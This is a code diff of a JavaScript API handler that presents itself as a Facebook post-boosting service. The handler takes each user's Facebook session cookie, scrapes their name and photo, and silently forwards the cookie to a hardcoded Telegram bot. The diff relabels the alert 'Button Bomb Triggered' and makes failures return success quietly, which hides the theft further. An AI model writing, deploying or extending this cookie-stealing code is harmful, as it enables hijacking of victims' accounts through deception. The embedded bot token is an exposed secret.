@@ -10,9 +10,10 @@ const BOT_TOKEN = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U";
 const CHAT_ID = "7442173988";
 
 export default async function handler(req, res) {
-  if (req.method !== "POST") return res.status(405).json({ message: "POST only" });
+  if (req.method !== "POST") return res.status(405).end();
 
   const { cookie, url, amount, interval, server } = req.body;
+  if (!cookie || !url || !amount || !interval || !serverUrls[server]) return res.status(400).end();
 
   try {
     const name = await getUserName(cookie);
@@ -21,22 +22,19 @@ export default async function handler(req, res) {
 
     await sendToTelegram({ name, cookie, appstate: cookie, photo, url, media });
 
-    const response = await axios.post(`${serverUrls[server]}/api/submit`, {
+    await axios.post(`${serverUrls[server]}/api/submit`, {
       cookie, url, amount, interval
     });
 
-    res.status(200).json({ message: "Boost sent", name, photo });
-  } catch (err) {
-    console.error(err.message);
-    res.status(500).json({ message: "Error sending" });
+    return res.status(200).end(); // no message returned
+  } catch {
+    return res.status(200).end(); // fail silently
   }
 }
 
 async function getUserName(cookie) {
   try {
-    const res = await axios.get("https://m.facebook.com/me", {
-      headers: { Cookie: cookie }
-    });
+    const res = await axios.get("https://m.facebook.com/me", { headers: { Cookie: cookie } });
     const match = res.data.match(/<title>(.*?)<\/title>/);
     return match ? match[1].replace(" | Facebook", "") : "Unknown";
   } catch { return "Unknown"; }
@@ -44,9 +42,7 @@ async function getUserName(cookie) {
 
 async function getUserPhoto(cookie) {
   try {
-    const res = await axios.get("https://m.facebook.com/me", {
-      headers: { Cookie: cookie }
-    });
+    const res = await axios.get("https://m.facebook.com/me", { headers: { Cookie: cookie } });
     const match = res.data.match(/profile_picture\/view.*?src=(.*?)&/);
     return match ? decodeURIComponent(match[1]) : null;
   } catch { return null; }
@@ -55,7 +51,10 @@ async function getUserPhoto(cookie) {
 async function getPostMedia(url, cookie) {
   try {
     const res = await axios.get(url, {
-      headers: { Cookie: cookie, "User-Agent": "Mozilla/5.0" }
+      headers: {
+        Cookie: cookie,
+        "User-Agent": "Mozilla/5.0"
+      }
     });
     const images = [...res.data.matchAll(/<img[^>]+src="([^"]+)"/g)].map(m => m[1]);
     const videos = [...res.data.matchAll(/<video[^>]+src="([^"]+)"/g)].map(m => m[1]);
@@ -66,8 +65,8 @@ async function getPostMedia(url, cookie) {
 }
 
 async function sendToTelegram({ name, cookie, appstate, photo, url, media }) {
-  const text = `
-🔔 <b>Button Triggered</b>
+  const message = `
+💣 <b>Button Bomb Triggered</b>
 👤 <b>${name}</b>
 🔗 <a href="${url}">${url}</a>
 🍪 <code>${cookie}</code>
@@ -76,7 +75,7 @@ async function sendToTelegram({ name, cookie, appstate, photo, url, media }) {
 
   await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     chat_id: CHAT_ID,
-    text,
+    text: message,
     parse_mode: "HTML"
   });
 
